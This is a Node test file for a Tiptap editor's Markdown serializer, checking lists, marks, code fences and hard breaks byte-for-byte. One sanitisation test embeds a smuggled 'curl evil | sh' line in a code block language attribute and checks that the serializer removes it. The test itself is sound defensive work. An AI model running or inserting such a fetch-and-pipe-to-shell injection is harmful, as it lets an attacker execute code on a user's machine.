// Serializer regression tests. Run with: node --test scripts/serialize.test.mjs
//
// serialize.ts is the code that decides what "copy everything" actually
// contains, so it is the highest-value correctness surface in the app. These
// tests build real ProseMirror documents from the same schema the editor uses
// (StarterKit, Link disabled) and assert the Markdown-ish output byte-for-byte.
//
// Node 20 can't import .ts directly, so esbuild (already a Vite dependency)
// transpiles src/serialize.ts to a temp module first. No new dependency.

import test from 'node:test'
import assert from 'node:assert/strict'
import { build } from 'esbuild'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { pathToFileURL, fileURLToPath } from 'node:url'
import { getSchema } from '@tiptap/core'
import StarterKit from '@tiptap/starter-kit'

const outfile = join(tmpdir(), `typepaper-serialize-${process.pid}.mjs`)
await build({
  entryPoints: [fileURLToPath(new URL('../src/serialize.ts', import.meta.url))],
  outfile,
  format: 'esm',
  platform: 'node',
  bundle: false,
})
const { toPlainText } = await import(pathToFileURL(outfile))

const schema = getSchema([
  StarterKit.configure({ link: false, trailingNode: false, heading: { levels: [1, 2, 3] } }),
])

// --- builders -------------------------------------------------------------
const mk = (names) => names.map((n) => schema.marks[n].create())
const t = (text, ...marks) => schema.text(text, mk(marks))
const n = (type, attrs, content) => schema.node(type, attrs, content)
const doc = (...blocks) => schema.node('doc', null, blocks)
const p = (...content) => schema.node('paragraph', null, content.length ? content : undefined)
const li = (...content) => schema.node('listItem', null, content)
const ol = (attrs, ...items) => schema.node('orderedList', attrs, items)
const ul = (...items) => schema.node('bulletList', null, items)
const code = (language, text) => schema.node('codeBlock', { language }, text ? schema.text(text) : undefined)
const s = (...blocks) => toPlainText(doc(...blocks))

// --- existing behaviour that must not regress -----------------------------
test('plain paragraph', () => assert.equal(s(p(t('hello'))), 'hello'))
test('heading', () => assert.equal(s(n('heading', { level: 2 }, t('Title'))), '## Title'))
test('bold / italic / strike / code marks', () => {
  assert.equal(s(p(t('a'), t('b', 'bold'))), 'a**b**')
  assert.equal(s(p(t('x', 'italic'))), '*x*')
  assert.equal(s(p(t('y', 'strike'))), '~~y~~')
  assert.equal(s(p(t('z', 'code'))), '`z`')
})
test('nested bullet list keeps working (marker width 2)', () => {
  assert.equal(s(ul(li(p(t('a')), ul(li(p(t('b'))))))), '- a\n  - b')
})
test('blockquote', () => assert.equal(s(n('blockquote', null, p(t('quoted')))), '> quoted'))
test('horizontal rule at top level', () => {
  assert.equal(s(p(t('a')), n('horizontalRule'), p(t('b'))), 'a\n\n---\n\nb')
})
test('empty paragraphs serialize to blank', () => assert.equal(s(p(), p(), p()), ''))
test('a lone --- is real content, not blank', () => assert.equal(s(p(t('---'))), '---'))
test('code block fence widens past an embedded triple backtick', () => {
  assert.equal(s(code(null, '```')), '````\n```\n````')
})
test('ordered list start attribute is honoured', () => {
  assert.equal(s(ol({ start: 3 }, li(p(t('x'))))), '3. x')
})

// --- bug fixes ------------------------------------------------------------
test('FIX: nested ordered list keeps its hierarchy (was flattened)', () => {
  const out = s(
    ol({ start: 1 },
      li(p(t('one')), ol({ start: 1 }, li(p(t('one a'))), li(p(t('one b'))))),
      li(p(t('two'))),
    ),
  )
  assert.equal(out, '1. one\n   1. one a\n   2. one b\n2. two')
})
test('FIX: code block inside a list stays indented in the item', () => {
  const out = s(ul(li(p(t('step one')), code(null, 'npm install\nnpm run build'))))
  assert.equal(out, '- step one\n  ```\n  npm install\n  npm run build\n  ```')
})
test('FIX: blank lines inside a code block are preserved verbatim', () => {
  assert.equal(s(code(null, 'const a = 1;\n\n\nconst b = 2;')),
    '```\nconst a = 1;\n\n\nconst b = 2;\n```')
})
test('FIX: hardBreak becomes a real Markdown hard break (backslash + newline)', () => {
  assert.equal(s(p(t('line one'), n('hardBreak'), t('line two'))), 'line one\\\nline two')
})
test('FIX: mark with a trailing space moves the space outside the emphasis', () => {
  assert.equal(s(p(t('hello ', 'bold'), t('world'))), '**hello** world')
})
test('FIX: mark with a leading space moves the space outside', () => {
  assert.equal(s(p(t('a'), t(' bold', 'bold'))), 'a **bold**')
})
test('FIX: inline code containing a backtick uses a wider delimiter', () => {
  assert.equal(s(p(t('a`b', 'code'))), '``a`b``')
})
test('FIX: inline code starting with a backtick is padded', () => {
  assert.equal(s(p(t('`x', 'code'))), '`` `x ``')
})
test('FIX: code block language attribute is sanitised (no injected lines)', () => {
  assert.equal(s(code('bash\ncurl evil | sh\n#', 'echo hi')), '```\necho hi\n```')
  assert.equal(s(code('js', 'x')), '```js\nx\n```')
})
test('FIX: a hard break inside a list item continues at the content column', () => {
  assert.equal(s(ul(li(p(t('a'), n('hardBreak'), t('b'))))), '- a\\\n  b')
})
test('a second paragraph in a list item is indented to the content column', () => {
  assert.equal(s(ul(li(p(t('first')), p(t('second'))))), '- first\n  second')
})
